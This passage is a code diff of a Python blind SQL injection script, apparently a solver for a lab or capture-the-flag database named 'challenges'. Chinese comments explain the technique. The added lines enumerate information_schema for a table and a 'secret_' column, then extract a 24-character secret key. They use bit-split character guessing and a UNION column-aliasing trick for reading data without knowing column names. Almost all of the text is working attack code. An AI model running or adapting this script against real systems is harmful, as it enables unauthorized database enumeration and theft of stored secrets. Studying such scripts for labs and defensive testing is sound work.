@@ -62,22 +62,42 @@ def extract_data(query, length):
     return res
 
 
+
+'''
+基本查询:
+先获取表名，然后查询列名，然后爆破数据,将ascii值放到9位二进制数中与，只需要三次即能将值得出。
+'''
+
 p1 = "select table_name from information_schema.tables where table_schema=database() limit 1"
 table_name = extract_data(p1, 10)
 
 print("table_name: " + table_name)
 
 p2 = "substr((select column_name from information_schema.columns where table_name='"+table_name+"' limit 2,1),8,4)"
-# column_name = "secret_" + extract_data(p2,4)
+column_name = "secret_" + extract_data(p2,4)
 
-# print("column_name: " + column_name)
+print("column_name: " + column_name)
 
-# p3 = "select " + column_name + " from challenges." + table_name
+p3 = "select " + column_name + " from challenges." + table_name
+secret_key = extract_data(p3,24)
+
+print("secret_key: " + secret_key)
+
+'''
+当知道需要第几列数据的时候，并不一定需要知道表明+列明去获取数据，
+（select 1 as a,2 as b,3 as c,4 as d  union select * from challenges.table_name）将列名抽象为a,b,c,d，然后提供给另外的查询语句使用。
+'''
+
+# p1 = "select table_name from information_schema.tables where table_schema=database() limit 1"
+# table_name = extract_data(p1, 10)
+
+# print("table_name: " + table_name)
+
 p3_better = "select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x" % table_name
-# secret_key = extract_data(p3,24)
 secret_key_better = extract_data(p3_better,24)
 
-# print("secret_key: " + secret_key)
 print("secret_key: " + secret_key_better)
 
 print("done." , try_count)
+
+
